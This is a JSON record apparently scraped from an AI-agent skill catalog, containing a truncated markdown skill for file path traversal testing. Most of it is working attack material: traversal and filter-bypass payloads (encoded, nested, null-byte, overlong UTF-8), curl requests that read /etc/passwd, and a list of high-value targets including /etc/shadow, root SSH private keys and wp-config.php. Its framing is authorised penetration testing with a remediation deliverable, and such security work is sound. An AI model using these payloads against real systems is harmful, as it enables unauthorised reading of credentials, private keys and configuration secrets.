{
  "id": "antigravity-file-path-traversal",
  "name": "File Path Traversal Testing",
  "slug": "file-path-traversal",
  "description": "This skill should be used when the user asks to \"test for directory traversal\", \"exploit path traversal vulnerabilities\", \"read arbitrary files through web applications\", \"find LFI vulnerabilities\", or \"access files outside web root\". It provides comprehensive file path traversal attack and testing ",
  "category": "Security & Systems",
  "source": "antigravity",
  "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
  "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/file-path-traversal",
  "content": "\n# File Path Traversal Testing\n\n## Purpose\n\nIdentify and exploit file path traversal (directory traversal) vulnerabilities that allow attackers to read arbitrary files on the server, potentially including sensitive configuration files, credentials, and source code. This vulnerability occurs when user-controllable input is passed to filesystem APIs without proper validation.\n\n## Prerequisites\n\n### Required Tools\n- Web browser with developer tools\n- Burp Suite or OWASP ZAP\n- cURL for testing payloads\n- Wordlists for automation\n- ffuf or wfuzz for fuzzing\n\n### Required Knowledge\n- HTTP request/response structure\n- Linux and Windows filesystem layout\n- Web application architecture\n- Basic understanding of file APIs\n\n## Outputs and Deliverables\n\n1. **Vulnerability Report** - Identified traversal points and severity\n2. **Exploitation Proof** - Extracted file contents\n3. **Impact Assessment** - Accessible files and data exposure\n4. **Remediation Guidance** - Secure coding recommendations\n\n## Core Workflow\n\n### Phase 1: Understanding Path Traversal\n\nPath traversal occurs when applications use user input to construct file paths:\n\n```php\n// Vulnerable PHP code example\n$template = \"blue.php\";\nif (isset($_COOKIE['template']) && !empty($_COOKIE['template'])) {\n    $template = $_COOKIE['template'];\n}\ninclude(\"/home/user/templates/\" . $template);\n```\n\nAttack principle:\n- `../` sequence moves up one directory\n- Chain multiple sequences to reach root\n- Access files outside intended directory\n\nImpact:\n- **Confidentiality** - Read sensitive files\n- **Integrity** - Write/modify files (in some cases)\n- **Availability** - Delete files (in some cases)\n- **Code Execution** - If combined with file upload or log poisoning\n\n### Phase 2: Identifying Traversal Points\n\nMap application for potential file operations:\n\n```bash\n# Parameters that often handle files\n?file=\n?path=\n?page=\n?template=\n?filename=\n?doc=\n?document=\n?folder=\n?dir=\n?include=\n?src=\n?source=\n?content=\n?view=\n?download=\n?load=\n?read=\n?retrieve=\n```\n\nCommon vulnerable functionality:\n- Image loading: `/image?filename=23.jpg`\n- Template selection: `?template=blue.php`\n- File downloads: `/download?file=report.pdf`\n- Document viewers: `/view?doc=manual.pdf`\n- Include mechanisms: `?page=about`\n\n### Phase 3: Basic Exploitation Techniques\n\n#### Simple Path Traversal\n\n```bash\n# Basic Linux traversal\n../../../etc/passwd\n../../../../etc/passwd\n../../../../../etc/passwd\n../../../../../../etc/passwd\n\n# Windows traversal\n..\\..\\..\\windows\\win.ini\n..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts\n\n# URL encoded\n..%2F..%2F..%2Fetc%2Fpasswd\n..%252F..%252F..%252Fetc%252Fpasswd  # Double encoding\n\n# Test payloads with curl\ncurl \"http://target.com/image?filename=../../../etc/passwd\"\ncurl \"http://target.com/download?file=....//....//....//etc/passwd\"\n```\n\n#### Absolute Path Injection\n\n```bash\n# Direct absolute path (Linux)\n/etc/passwd\n/etc/shadow\n/etc/hosts\n/proc/self/environ\n\n# Direct absolute path (Windows)\nC:\\windows\\win.ini\nC:\\windows\\system32\\drivers\\etc\\hosts\nC:\\boot.ini\n```\n\n### Phase 4: Bypass Techniques\n\n#### Bypass Stripped Traversal Sequences\n\n```bash\n# When ../ is stripped once\n....//....//....//etc/passwd\n....\\/....\\/....\\/etc/passwd\n\n# Nested traversal\n..././..././..././etc/passwd\n....//....//etc/passwd\n\n# Mixed encoding\n..%2f..%2f..%2fetc/passwd\n%2e%2e/%2e%2e/%2e%2e/etc/passwd\n%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\n```\n\n#### Bypass Extension Validation\n\n```bash\n# Null byte injection (older PHP versions)\n../../../etc/passwd%00.jpg\n../../../etc/passwd%00.png\n\n# Path truncation\n../../../etc/passwd...............................\n\n# Double extension\n../../../etc/passwd.jpg.php\n```\n\n#### Bypass Base Directory Validation\n\n```bash\n# When path must start with expected directory\n/var/www/images/../../../etc/passwd\n\n# Expected path followed by traversal\nimages/../../../etc/passwd\n```\n\n#### Bypass Blacklist Filters\n\n```bash\n# Unicode/UTF-8 encoding\n..%c0%af..%c0%af..%c0%afetc/passwd\n..%c1%9c..%c1%9c..%c1%9cetc/passwd\n\n# Overlong UTF-8 encoding\n%c0%2e%c0%2e%c0%af\n\n# URL encoding variations\n%2e%2e/\n%2e%2e%5c\n..%5c\n..%255c\n\n# Case variations (Windows)\n....\\\\....\\\\etc\\\\passwd\n```\n\n### Phase 5: Linux Target Files\n\nHigh-value files to target:\n\n```bash\n# System files\n/etc/passwd           # User accounts\n/etc/shadow           # Password hashes (root only)\n/etc/group            # Group information\n/etc/hosts            # Host mappings\n/etc/hostname         # System hostname\n/etc/issue            # System banner\n\n# SSH files\n/root/.ssh/id_rsa           # Root private key\n/root/.ssh/authorized_keys  # Authorized keys\n/home/<user>/.ssh/id_rsa    # User private keys\n/etc/ssh/sshd_config        # SSH configuration\n\n# Web server files\n/etc/apache2/apache2.conf\n/etc/nginx/nginx.conf\n/etc/apache2/sites-enabled/000-default.conf\n/var/log/apache2/access.log\n/var/log/apache2/error.log\n/var/log/nginx/access.log\n\n# Application files\n/var/www/html/config.php\n/var/www/html/wp-config.php\n/var/www/html/.htaccess\n/var",
  "tags": [
    "python",
    "pdf",
    "api",
    "ai",
    "agent",
    "automation",
    "workflow",
    "template",
    "document",
    "image"
  ],
  "useCases": [],
  "scrapedAt": "2026-01-26T13:18:22.103Z"
}